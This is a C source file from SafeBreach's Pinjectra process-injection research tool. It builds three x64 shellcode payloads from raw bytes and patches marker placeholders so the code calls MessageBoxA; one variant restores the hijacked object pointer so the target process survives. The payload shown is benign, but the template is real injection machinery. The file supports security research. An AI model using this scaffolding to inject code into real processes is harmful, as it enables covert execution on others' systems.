/**************************************************************************
*                                                                         *
* Copyright (c) 2019, SafeBreach                                          *
* All rights reserved.                                                    *
*                                                                         *
* Redistribution and use in source and binary forms, with or without      *
* modification, are permitted provided that the following conditions are  *
* met:                                                                    *
*                                                                         *
*  1. Redistributions of source code must retain the above                *
* copyright notice, this list of conditions and the following             *
* disclaimer.                                                             *
*                                                                         *
*  2. Redistributions in binary form must reproduce the                   *
* above copyright notice, this list of conditions and the following       *
* disclaimer in the documentation and/or other materials provided with    *
* the distribution.                                                       *
*                                                                         *
*  3. Neither the name of the copyright holder                            *
* nor the names of its contributors may be used to endorse or promote     *
* products derived from this software without specific prior written      *
* permission.                                                             *
*                                                                         *
* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS                      *
* AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,         *
* INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF                *
* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.    *
* IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR    *
* ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL  *
* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE       *
* GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS           *
* INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER    *
* IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR         *
* OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF  *
* ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.                              *
*                                                                         *
***************************************************************************/

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

#include "StaticPayloads.h"

/*
		mov rax,0x4444444444444444
		push rax
		mov rax,0x5555555555555555
		push rax
		xor rcx,rcx
		mov rdx,rsp
		mov r8,rsp
		add r8,8
		xor r9,r9
		mov rax,0x3333333333333333
		sub rsp,0x28
		call rax
		add rsp,0x38
		mov rax,0xdeadbeef
		//ret (C3)
		jmp -2 (EB FE)
*/

char* _gen_payload_1() {
	char* payload;
	long long marker_text = 0x4444444444444444;
	char text[8] = "Hello!";
	long long marker_caption = 0x5555555555555555;
	char caption[8] = "World";
	long long marker_func = 0x3333333333333333;
	void* func_ptr = MessageBoxA;

	payload = (char*)malloc(PAYLOAD1_SIZE);

	if (payload == NULL)
		return NULL;

	memcpy(payload, "\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\x00\x00\x00\x00\xEB\xFE", PAYLOAD1_SIZE);
	memcpy(memmem(payload, PAYLOAD1_SIZE, (char*)& marker_text, 8), text, 8);
	memcpy(memmem(payload, PAYLOAD1_SIZE, (char*)& marker_caption, 8), caption, 8);
	memcpy(memmem(payload, PAYLOAD1_SIZE, (char*)& marker_func, 8), &func_ptr, 8);

	return payload;
}

/*
	mov rax,0x4444444444444444
	push rax
	mov rax,0x5555555555555555
	push rax
	xor rcx,rcx
	mov rdx,rsp
	mov r8,rsp
	add r8,8
	xor r9,r9
	mov rax,0x3333333333333333
	sub rsp,0x28
	call rax
	add rsp,0x38
	mov rax,0xdeadbeef
	ret //(C3)
	//jmp -2 (EB FE)
*/

char* _gen_payload_2()
{
	char* payload;
	long long marker_text = 0x4444444444444444;
	char text[8] = "Hello!";
	long long marker_caption = 0x5555555555555555;
	char caption[8] = "World";
	long long marker_func = 0x3333333333333333;
	void* func_ptr = MessageBoxA;

	payload = (char*)malloc(PAYLOAD2_SIZE);

	if (payload == NULL)
		return NULL;

	memcpy(payload, "\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\x00\x00\x00\x00\xC3", PAYLOAD2_SIZE);
	memcpy(memmem(payload, PAYLOAD2_SIZE, (char*)& marker_text, 8), text, 8);
	memcpy(memmem(payload, PAYLOAD2_SIZE, (char*)& marker_caption, 8), caption, 8);
	memcpy(memmem(payload, PAYLOAD2_SIZE, (char*)& marker_func, 8), &func_ptr, 8);

	return payload;
}

/*
	mov rax,0x4444444444444444
	push rax
	mov rax,0x5555555555555555
	push rax
	xor rcx,rcx
	mov rdx,rsp
	mov r8,rsp
	add r8,8
	xor r9,r9
	mov rax,0x3333333333333333
	sub rsp,0x28  // Extra 8 bytes to make sure the stack is 16-byte aligned.
	call rax
	add rsp,0x38
	mov eax,2 // simulate the return of the original object function
	mov rbx,0x6666666666666666 // restore the original object pointer into rbx
	ret
*/

char* _gen_payload_3()
{
	char* payload;
	DWORD64 marker_text = 0x4444444444444444;
	char text[8] = "Hello!";
	DWORD64 marker_caption = 0x5555555555555555;
	char caption[8] = "World";
	DWORD64 marker_func = 0x3333333333333333;
	void* func_ptr = MessageBoxA;

	payload = (char*)malloc(PAYLOAD3_SIZE);

	if (payload == NULL)
		return NULL;

	memcpy(payload, "\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\xB8\x02\x00\x00\x00\x48\xBB\x66\x66\x66\x66\x66\x66\x66\x66\xC3", PAYLOAD3_SIZE);
	memcpy(memmem(payload, PAYLOAD3_SIZE, (char*)& marker_text, 8), text, 8);
	memcpy(memmem(payload, PAYLOAD3_SIZE, (char*)& marker_caption, 8), caption, 8);
	memcpy(memmem(payload, PAYLOAD3_SIZE, (char*)& marker_func, 8), &func_ptr, 8);

	return payload;
}
